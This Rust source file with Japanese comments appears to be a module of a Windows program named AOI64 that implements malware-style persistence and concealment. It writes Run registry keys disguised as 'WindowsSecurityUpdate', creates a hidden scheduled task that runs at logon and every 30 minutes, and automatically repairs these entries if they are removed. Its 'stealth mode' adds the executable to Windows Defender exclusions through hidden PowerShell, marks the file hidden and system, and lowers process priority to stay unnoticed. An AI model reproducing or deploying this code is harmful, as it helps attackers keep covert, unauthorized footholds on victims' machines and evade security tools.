use crate::Config;
use std::env;
use std::process::Command;
use windows::core::PCWSTR;
use windows::Win32::System::Registry::{
    RegCreateKeyExW, RegSetKeyValueW, RegCloseKey, RegQueryValueExW, HKEY, 
    HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_64KEY, 
    KEY_WRITE, REG_OPTION_NON_VOLATILE, REG_SZ,
};
use windows::Win32::System::Threading::CreateMutexW;
use windows::Win32::Foundation::{CloseHandle, GetLastError, ERROR_ALREADY_EXISTS};

fn wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }

/// Opens or creates an HKCU subkey with read/write access (64-bit view).
pub unsafe fn open_or_create_hkcu(subkey: &str) -> windows::core::Result<HKEY> {
    let mut hk: HKEY = HKEY::default();
    let wsub = wide(subkey);
    RegCreateKeyExW(
        HKEY_CURRENT_USER,
        PCWSTR(wsub.as_ptr()),
        Some(0),
        PCWSTR::null(),
        REG_OPTION_NON_VOLATILE,
        KEY_READ | KEY_WRITE | KEY_WOW64_64KEY,
        None,
        &mut hk,
        None,
    )
    .ok()?;
    Ok(hk)
}

/// Opens or creates an HKLM subkey with read/write access (64-bit view).
/// Requires administrator privileges.
pub unsafe fn open_or_create_hklm(subkey: &str) -> windows::core::Result<HKEY> {
    let mut hk: HKEY = HKEY::default();
    let wsub = wide(subkey);
    RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        PCWSTR(wsub.as_ptr()),
        Some(0),
        PCWSTR::null(),
        REG_OPTION_NON_VOLATILE,
        KEY_READ | KEY_WRITE | KEY_WOW64_64KEY,
        None,
        &mut hk,
        None,
    )
    .ok()?;
    Ok(hk)
}

/// Sets a REG_SZ value on an already opened key.
pub unsafe fn set_string(hk: HKEY, name: &str, data: &str) -> windows::core::Result<()> {
    let wname = wide(name);
    let wdata = wide(data); // REG_SZ includes the NUL terminator in size
    RegSetKeyValueW(
        hk,
        PCWSTR::null(),
        PCWSTR(wname.as_ptr()),
        REG_SZ.0,
        Some(wdata.as_ptr().cast()),
        (wdata.len() * 2) as u32,
    )
    .ok()?;
    Ok(())
}

/// Closes a registry key handle.
pub unsafe fn close_key(hk: HKEY) {
    let _ = RegCloseKey(hk);
}

/// Checks if the current process is running with administrator privileges.
pub fn is_elevated() -> bool {
    unsafe {
        use windows::Win32::UI::Shell::IsUserAnAdmin;
        IsUserAnAdmin().as_bool()
    }
}

/// 既存プロセスをチェックし、多重起動を防止
#[cfg(windows)]
pub fn check_and_prevent_multiple_instances() -> Result<bool, String> {
    let mutex_name = "Global\\AOI64_SingleInstance_Mutex";
    let wide_name = mutex_name.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
    
    unsafe {
        let mutex_handle = CreateMutexW(
            None,
            true, // bInitialOwner - 作成時に所有権を取得
            PCWSTR(wide_name.as_ptr())
        );
        
        match mutex_handle {
            Ok(handle) => {
                let error = GetLastError();
                if error == ERROR_ALREADY_EXISTS {
                    // 既にミューテックスが存在する場合（多重起動検出）
                    let _ = CloseHandle(handle);
                    return Ok(false); // 多重起動検出
                }
                
                // 正常にミューテックスを作成・取得した場合
                // プロセス終了時に自動的にミューテックスは解放される
                println!("✅ 単一インスタンスミューテックス取得成功");
                Ok(true) // 初回起動
            }
            Err(e) => {
                Err(format!("ミューテックス作成失敗: {:?}", e))
            }
        }
    }
}

#[cfg(not(windows))]
pub fn check_and_prevent_multiple_instances() -> Result<bool, String> {
    // Windows以外では常に起動を許可
    Ok(true)
}

/// レジストリベースの永続化処理を実装
#[cfg(windows)]
pub async fn setup_persistence(config: &Config) {
    // 現在の実行ファイルパスを取得
    let exe_path = match env::current_exe() {
        Ok(path) => path.display().to_string(),
        Err(_) => return,
    };

    let is_admin = is_elevated();

    unsafe {
        // 単一エントリのみ設定（多重起動防止）
        if is_admin {
            // 管理者権限がある場合: HKLM のみに設定
            if let Ok(hkey) = open_or_create_hklm("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") {
                let _ = set_string(hkey, "WindowsSecurityUpdate", &exe_path);
                close_key(hkey);
            }
        } else {
            // 通常権限の場合: HKCU のみに設定
            if let Ok(hkey) = open_or_create_hkcu("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
                let _ = set_string(hkey, "AOI64SystemMonitor", &exe_path);
                close_key(hkey);
            }
        }
        
        // 自己隠蔽処理（設定フラグによる制御）
        if config.enable_stealth_mode {
            setup_stealth_operations(config).await;
        } else {
            println!("ℹ️  ステルスモードは無効に設定されています");
        }
    }
}

#[cfg(not(windows))]
pub async fn setup_persistence(_config: &Config) {
    println!("ℹ️  Windows以外のプラットフォームでは永続化をスキップします");
}

/// 永続化メカニズム（単一エントリのみ - 多重起動防止）
#[cfg(windows)]
pub async fn setup_additional_persistence(exe_path: &str) {
    let is_admin = is_elevated();
    
    // 単一エントリのみ設定（多重起動防止）
    // HKLM優先、権限がない場合はHKCUにフォールバック
    if is_admin {
        // 管理者権限がある場合: HKLM のみに設定
        unsafe {
            if let Ok(hkey) = open_or_create_hklm("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") {
                let _ = set_string(hkey, "WindowsSecurityUpdate", exe_path);
                close_key(hkey);
                println!("✅ HKLM 永続化: WindowsSecurityUpdate");
            }
        }
    } else {
        // 通常権限の場合: HKCU のみに設定
        unsafe {
            if let Ok(hkey) = open_or_create_hkcu("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
                let _ = set_string(hkey, "SecurityUpdateService", exe_path);
                close_key(hkey);
                println!("✅ HKCU 永続化: SecurityUpdateService");
            }
        }
    }

    // タスクスケジューラーはオプションとして残す（設定で制御可能にする）
    // setup_scheduled_task_persistence(exe_path).await;
}

/// タスクスケジューラーを使用した永続化
#[cfg(windows)]
pub async fn setup_scheduled_task_persistence(exe_path: &str) {
    let task_name = "SystemMaintenanceTask";
    let task_xml = format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>2024-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT30M</Interval>
        <Duration>P1D</Duration>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{}</Command>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
</Task>"#, exe_path);

    // 一時XMLファイルを作成
    let temp_xml = env::temp_dir().join(format!("{}.xml", task_name));
    if std::fs::write(&temp_xml, task_xml).is_err() {
        return;
    }

    // タスクスケジューラーに登録（非同期実行）
    let temp_xml_path = temp_xml.display().to_string();
    let task_result = tokio::task::spawn_blocking(move || {
        Command::new("schtasks")
            .args([
                "/create",
                "/tn",
                task_name,
                "/xml",
                &temp_xml_path,
                "/f"
            ])
            .output()
    }).await;

    match task_result {
        Ok(Ok(output)) => {
            if output.status.success() {
                println!("✅ スケジュールタスク作成完了: {}", task_name);
            } else {
                println!("⚠️  スケジュールタスク作成失敗: {}", 
                    String::from_utf8_lossy(&output.stderr));
            }
        }
        Ok(Err(e)) => {
            println!("❌ スケジュールタスクコマンド実行失敗: {}", e);
        }
        Err(e) => {
            println!("❌ タスク実行エラー: {}", e);
        }
    }

    // 一時ファイルを削除
    let _ = std::fs::remove_file(&temp_xml);
}

/// 永続化設定の検証と修復
#[cfg(windows)]
pub async fn verify_and_repair_persistence(_config: &Config) {
    let exe_path = match env::current_exe() {
        Ok(path) => path.display().to_string(),
        Err(_) => return,
    };
    
    let is_admin = is_elevated();
    let mut repairs_needed = false;
    
    unsafe {
        // 単一エントリのみチェック（多重起動防止）
        if is_admin {
            // 管理者権限がある場合: HKLM をチェック
            if let Ok(hkey) = open_or_create_hklm("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") {
                if verify_and_repair_registry_entry(hkey, "WindowsSecurityUpdate", &exe_path, "HKLM") {
                    repairs_needed = true;
                }
                close_key(hkey);
            }
        } else {
            // 通常権限の場合: HKCU をチェック
            if let Ok(hkey) = open_or_create_hkcu("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
                if verify_and_repair_registry_entry(hkey, "AOI64SystemMonitor", &exe_path, "HKCU") {
                    repairs_needed = true;
                }
                close_key(hkey);
            }
        }
        
        let _ = repairs_needed; // 使用済みの変数を明示
    }
}

#[cfg(not(windows))]
pub async fn verify_and_repair_persistence(_config: &Config) {
    // Windows以外では何もしない
}

/// 個別のレジストリエントリを検証・修復
#[cfg(windows)]
unsafe fn verify_and_repair_registry_entry(
    hkey: HKEY, 
    name: &str, 
    exe_path: &str,
    _registry_root: &str
) -> bool {
    // レジストリ値の存在をチェック
    let wname = name.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
    let mut buffer = vec![0u8; 512];
    let mut buffer_size = buffer.len() as u32;
    let mut reg_type = 0u32;
    
    let query_result = RegQueryValueExW(
        hkey,
        PCWSTR(wname.as_ptr()),
        None,
        Some(&mut reg_type as *mut u32 as *mut _),
        Some(buffer.as_mut_ptr()),
        Some(&mut buffer_size),
    );
    
    if query_result.is_err() || reg_type != REG_SZ.0 {
        // レジストリエントリが存在しない、または不正な場合は修復
        if set_string(hkey, name, exe_path).is_ok() {
            return true;
        }
    } else {
        // 値が存在する場合、パスが正しいかチェック
        buffer.truncate(buffer_size as usize);
        let current_value = String::from_utf8_lossy(&buffer);
        if !current_value.trim_end_matches('\0').eq(exe_path) {
            // パスが異なる場合は更新
            if set_string(hkey, name, exe_path).is_ok() {
                return true;
            }
        }
    }
    
    false
}

/// 自己隠蔽処理（プロセス偽装・実行ファイル隠蔽）
#[cfg(windows)]
async fn setup_stealth_operations(config: &Config) {
    // Windows Defenderの除外リストに追加を試行（設定により制御）
    if config.enable_defender_exclusion {
        add_to_defender_exclusion().await;
    }
    
    // 実行ファイルの隠蔽処理（設定により制御）
    if config.enable_file_hiding {
        hide_executable_file().await;
    }
    
    // プロセス優先度を下げて目立たなくする（設定により制御）
    if config.enable_process_priority_adjustment {
        set_process_priority().await;
    }
}

/// Windows Defenderの除外リストに追加
#[cfg(windows)]
async fn add_to_defender_exclusion() {
    if let Ok(exe_path) = env::current_exe() {
        let exe_path_str = exe_path.display().to_string();
        
        // PowerShellを使ってDefenderの除外リストに追加を試行
        let powershell_cmd = format!(
            "Add-MpPreference -ExclusionPath '{}' -Force", 
            exe_path_str
        );
        
        let _result = tokio::task::spawn_blocking(move || {
            Command::new("powershell")
                .args(["-WindowStyle", "Hidden", "-Command", &powershell_cmd])
                .output()
        }).await;
        
        // エラーチェックはしない（管理者権限がない場合は失敗するが、それでも動作継続）
        println!("🛡️  Defender除外リスト追加を試行");
    }
}

/// 実行ファイルの隠蔽処理
#[cfg(windows)]
async fn hide_executable_file() {
    if let Ok(exe_path) = env::current_exe() {
        let exe_path_str = exe_path.display().to_string();
        
        // ファイル属性を隠しファイルに設定
        let _result = tokio::task::spawn_blocking(move || {
            Command::new("attrib")
                .args(["+H", "+S", &exe_path_str])
                .output()
        }).await;
        
        println!("👻 実行ファイル隠蔽処理完了");
    }
}

/// プロセス優先度調整
#[cfg(windows)]
async fn set_process_priority() {
    use windows::Win32::System::Threading::{
        GetCurrentProcess, SetPriorityClass, BELOW_NORMAL_PRIORITY_CLASS
    };
    
    unsafe {
        let process_handle = GetCurrentProcess();
        let _ = SetPriorityClass(process_handle, BELOW_NORMAL_PRIORITY_CLASS);
    }
    
    println!("⚡ プロセス優先度調整完了");
}